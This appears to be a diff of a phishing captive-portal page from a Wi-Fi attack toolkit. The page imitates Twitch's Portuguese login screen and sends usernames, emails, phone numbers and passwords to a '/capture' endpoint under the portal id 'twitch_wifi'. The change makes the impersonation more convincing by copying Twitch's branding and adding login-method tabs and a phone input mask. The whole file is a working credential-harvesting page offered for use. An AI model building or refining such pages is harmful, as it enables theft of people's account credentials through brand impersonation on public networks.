@@ -2,58 +2,89 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-<meta name="robots" content="noindex, nofollow">
-<title>Twitch - Wi-Fi</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Twitch - Fazer login</title>
 <style>
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-html { font-size: 16px; }
-body { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0E0E10; color: #EFEFF1; padding: 16px; }
-.card { background: #1F1F23; border-radius: 12px; padding: 32px 28px; width: 100%; max-width: 400px; box-shadow: 0 4px 24px rgba(0,0,0,0.4); }
-.logo { text-align: center; margin-bottom: 24px; font-size: 28px; font-weight: 800; letter-spacing: -0.5px; color: #9146FF; }
-.logo-icon { font-size: 36px; display: block; margin-bottom: 4px; }
-.subtitle { text-align: center; color: #ADADB8; font-size: 14px; margin-bottom: 28px; line-height: 1.5; }
-.form-group { margin-bottom: 16px; }
-label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #EFEFF1; }
-input[type="password"], input[type="email"], input[type="text"] { width: 100%; padding: 13px 16px; border: 1.5px solid #3A3A3D; border-radius: 8px; font-size: 15px; background: #0E0E10; color: #EFEFF1; outline: none; transition: border-color 0.2s; }
-input:focus { border-color: #9146FF; }
-button[type="submit"] { width: 100%; padding: 14px; background: #9146FF; color: #FFFFFF; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 8px; transition: opacity 0.2s; }
-button:hover { opacity: 0.92; }
-.footer { text-align: center; margin-top: 20px; font-size: 11px; color: #ADADB8; }
-input[type="hidden"] { display: none; }
-@media (max-width: 480px) { .card { padding: 24px 18px; } .logo { font-size: 24px; } }
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{min-height:100vh;background:#0e0e10;color:#efeff1;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;padding:16px}
+.container{width:100%;max-width:360px}
+.twitch-logo{text-align:center;margin-bottom:24px}
+.logo-text{font-size:30px;font-weight:900;color:#9146ff;letter-spacing:-1px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
+.logo-text span{display:inline-block;width:12px;height:22px;background:#9146ff;margin-right:6px;border-radius:2px 2px 4px 4px;vertical-align:middle;position:relative;top:-2px}
+.logo-text span::before{content:'';position:absolute;top:-5px;right:-4px;width:6px;height:6px;background:#9146ff;border-radius:1px}
+h1{font-size:22px;font-weight:700;color:#efeff1;text-align:center;margin-bottom:28px}
+.method-tabs{display:flex;gap:0;border-bottom:2px solid #3a3a3d;margin-bottom:24px}
+.mtab{flex:1;padding:12px 8px;background:transparent;border:none;border-bottom:3px solid transparent;color:#adadb8;font-size:14px;font-weight:700;cursor:pointer;transition:all .2s;text-align:center;margin-bottom:-2px}
+.mtab.active{color:#9146ff;border-bottom-color:#9146ff}
+.tab-pane{display:none}
+.tab-pane.active{display:block}
+label{display:block;font-size:12px;font-weight:700;color:#adadb8;margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px}
+input[type=text],input[type=email],input[type=password]{width:100%;background:#1f1f23;border:1px solid #3a3a3d;border-radius:6px;padding:13px 14px;font-size:16px;color:#efeff1;outline:none;margin-bottom:18px;transition:border-color .2s}
+input:focus{border-color:#9146ff}
+.btn-login{width:100%;padding:13px;background:#9146ff;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:700;cursor:pointer;margin-top:4px;transition:opacity .2s;letter-spacing:.3px}
+.btn-login:hover{opacity:.85}
+.divider{display:flex;align-items:center;gap:10px;margin:20px 0;color:#3a3a3d;font-size:13px}
+.divider::before,.divider::after{content:'';flex:1;height:1px;background:#3a3a3d}
+.otp-btn{width:100%;padding:11px;background:transparent;color:#9146ff;border:1px solid #9146ff;border-radius:4px;font-size:14px;font-weight:700;cursor:pointer;transition:all .2s}
+.otp-btn:hover{background:#9146ff20}
+.links{text-align:center;margin-top:24px;font-size:13px;color:#adadb8}
+.links a{color:#9146ff;text-decoration:none;font-weight:700}
+.links a:hover{text-decoration:underline}
+.signup{text-align:center;margin-top:32px;font-size:14px;color:#adadb8;border-top:1px solid #3a3a3d;padding-top:20px}
+.signup a{color:#9146ff;text-decoration:none;font-weight:700}
+@media(max-width:480px){h1{font-size:20px}}
 </style>
 </head>
 <body>
-<div class="card">
-  <div class="logo">twitch</div>
-  <p class="subtitle">Faca login com sua conta Twitch para acessar o Wi-Fi gratuito</p>
+<div class="container">
+  <div class="twitch-logo">
+    <span class="logo-text">twitch</span>
+  </div>
+  <h1>Fazer login</h1>
+  <div class="method-tabs">
+    <button class="mtab active" onclick="switchM('user',this)">Nome de usuario</button>
+    <button class="mtab" onclick="switchM('email',this)">E-mail</button>
+    <button class="mtab" onclick="switchM('phone',this)">Telefone</button>
+  </div>
   <form action="/capture" method="POST" autocomplete="off">
     <input type="hidden" name="csrf_token" value="">
-    <input type="hidden" name="portal_id" value="twitch">
-    <div class="form-group">
-      <label for="email">Usuario ou e-mail</label>
-      <input type="email" name="email" id="email" placeholder="seu@email.com" required autocomplete="off">
+    <input type="hidden" name="portal_id" value="twitch_wifi">
+    <input type="hidden" name="login_method" id="tmethod" value="user">
+    <div class="tab-pane active" id="tpane-user">
+      <label>Nome de usuario</label>
+      <input type="text" name="username" placeholder="Seu nome de usuario" autocomplete="off">
     </div>
-    <div class="form-group">
-      <label for="password">Senha</label>
-      <input type="password" name="password" id="password" placeholder="Sua senha" required minlength="6" maxlength="128" autocomplete="new-password">
+    <div class="tab-pane" id="tpane-email">
+      <label>E-mail</label>
+      <input type="email" name="email" placeholder="Seu e-mail" autocomplete="off">
     </div>
-    <button type="submit">Entrar com Twitch</button>
+    <div class="tab-pane" id="tpane-phone">
+      <label>Numero de telefone</label>
+      <input type="text" name="phone" placeholder="(00) 00000-0000" oninput="maskPhone(this)" autocomplete="off">
+    </div>
+    <label>Senha</label>
+    <input type="password" name="password" placeholder="Senha" required minlength="8" maxlength="128" autocomplete="new-password">
+    <button class="btn-login" type="submit">Fazer login</button>
   </form>
-  <p class="footer">Ao conectar, voce aceita os Termos de Servico da Twitch</p>
+  <div class="divider"><span>ou</span></div>
+  <button class="otp-btn" type="button" onclick="return false">Entrar com senha de uso unico</button>
+  <p class="links"><a href="#" onclick="return false">Esqueci minha senha</a></p>
+  <p class="signup">Nao tem conta? <a href="#" onclick="return false">Cadastre-se no Twitch</a></p>
 </div>
 <script>
-(function(){
-  var lang = navigator.language || 'pt-BR';
-  if (lang.startsWith('en')) {
-    document.querySelector('.subtitle').textContent = 'Log in with your Twitch account to access free Wi-Fi';
-    document.querySelector('button[type=submit]').textContent = 'Log in with Twitch';
-    document.querySelector('.footer').textContent = 'By connecting, you agree to Twitch Terms of Service';
-    document.querySelector('label[for=email]').textContent = 'Username or email';
-    document.querySelector('label[for=password]').textContent = 'Password';
-  }
-})();
+function switchM(t,btn){
+  document.querySelectorAll('.tab-pane').forEach(function(e){e.classList.remove('active')});
+  document.querySelectorAll('.mtab').forEach(function(e){e.classList.remove('active')});
+  document.getElementById('tpane-'+t).classList.add('active');
+  btn.classList.add('active');
+  document.getElementById('tmethod').value=t;
+}
+function maskPhone(el){
+  var v=el.value.replace(/\D/g,'').slice(0,11);
+  if(v.length>6)v=v.replace(/(\d{2})(\d{4,5})(\d{4})/,'($1) $2-$3');
+  else if(v.length>2)v=v.replace(/(\d{2})(\d+)/,'($1) $2');
+  el.value=v;
+}
 </script>
 </body>
 </html>
